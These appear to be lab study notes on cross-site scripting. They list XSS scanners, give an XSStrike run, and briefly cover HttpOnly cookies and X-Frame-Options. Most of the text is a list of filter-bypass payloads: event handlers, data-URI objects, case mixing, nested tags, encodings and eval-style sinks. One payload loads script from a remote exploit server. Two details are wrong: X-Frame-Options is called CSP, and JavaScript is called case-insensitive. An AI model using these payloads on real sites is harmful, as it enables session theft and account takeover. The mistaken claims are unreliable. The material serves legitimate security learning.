# XSS Tools
https://github.com/s0md3v/XSStrike
https://github.com/rajeshmajumdar/BruteXSS
https://github.com/epsylon/xsser
### How to check for XSS automatically
```
python xsstrike.py -u "http://SERVER_IP:PORT/index.php?task=test" 
```
(We have to ship the location to check the XSS)
```

Results:
------------------------------------------------------------
[+] Payload: '><HtMl%09OnpOINTerENTer%09=%09[8].find(confirm)>
[!] Efficiency: 100
[!] Confidence: 9
[?] Would you like to continue scanning? [y/N] y
------------------------------------------------------------

```
What is useful here is the structure `'><payload>` not the gibberish that is about



# XSS Defense
### HTTP-Only Cookie
This will prevent XSS from stealing session cookies via XSS(specifically via document.cookie). 
### Deny Click-jacking attacks via iframe tags**
```
X-Frame-Options: DENY
```
(AKA CSP protection)



# XSS Bypasses
### XSS Filter Bypass lists
If you want to execute some JS code then you have 3 different options:
```
<script>alert(1)</script>
```
(will execute JS code within tags)  
```
<a href="javascript:alert(1)">click</a>   
```
(will execute JS code when a HTML link is executed)
```
<object data="data:text/html,<script>alert(1)</script>">   
```
(will execute JS code without user interaction)
```
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="> 
```
(will execute JS code without user interaction, b64 encoded)
```

<img src=x onerror=alert(1)>
<svg onload=alert(1)>
```
(will execute JS code when upon a event like error/load)

### ONERROR & ONLOAD Bypass
If back-end blacklist some words like script, **onerror**, **onload** then you can play around with cases, since JS is case insensitive
<ScRiPt>alert(1);</ScRiPt>
```
<object data="JaVaScRiPt:alert(1)">
<img src=x OnErRoR=alert(1)>
<ScRiPt SrC=http://exploitserver.htb/exploit></ScRiPt>
```
If back-end strip down some words example script you can use something similar if it fails with recursions:
```
<scr<script>ipt>alert(1);</scr<script>ipt>
```
OR with **eval()** function.This will evaluate the B64 encoded command and bypass eventual script word blacklist
<ScRiPt>Function(atob("YWxlcnQoMSk="))()</ScRiPt>  

### Advanced Bypasses
Suppose we inject an HTML tag, resulting in JavaScript code execution. In that case, we may need to bypass additional filters applied to the JavaScript code, which restrict which functions we can call or which data we can access in the JavaScript context. There are many techniques we can apply to attempt to bypass such filters. We will explore how to bypass filters by encoding strings and passing these strings to execution sinks to execute the JavaScript code.
In JavaScript, we can apply many different encoding to strings that help us evade blacklists. Here are different encoding of the string **"alert(1)":**
Code: js
```
"\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0029"
```
(Unicode)
```
"\141\154\145\162\164\50\61\51"
```
(Octal Encoding)
```
"\x61\x6c\x65\x72\x74\x28\x31\x29"
```
(Hex Encoding)
```
atob("YWxlcnQoMSk=")
```
(Base64 Encoding)
To supply our payload in a string, we need to be able to use quotes. If a filter removes or blocks quotes, we can use one of the following tricks to create a string containing our payload:
```
String.fromCharCode(97,108,101,114,116,40,49,41)
```
(String.fromCharCode)
```
/alert(1)/.source
```
(.source)
```
decodeURI(/alert(%22xss%22)/.source)
```
(URL Encoding)

Thus far, we have only managed to supply our payload in a string; however, the browser will only execute it if it is passed to an execution sink that takes a string as input. The most famous example of such an execution sink is the eval function; in addition to eval, other execution sinks include:
```
eval("alert(1)")
setTimeout("alert(1)")
setInterval("alert(1)")
Function("alert(1)")()
[].constructor.constructor(alert(1))()
```
At last, we can combine an execution sink with an encoded string to attempt to bypass a weak XSS filter:
```
eval("\141\154\145\162\164\50\61\51")
setTimeout(String.fromCharCode(97,108,101,114,116,40,49,41))
Function(atob("YWxlcnQoMSk="))()
```
Note: To bypass an XSS filter in the real-world, we can apply the same methodology used in bypassing filters for other vulnerabilities, such as SQL injection or command injection. The actual bypass depends on the filter implemented by the web application. It requires careful testing to identify which keywords are whitelisted or blacklisted to come up with an exploit that is not blocked.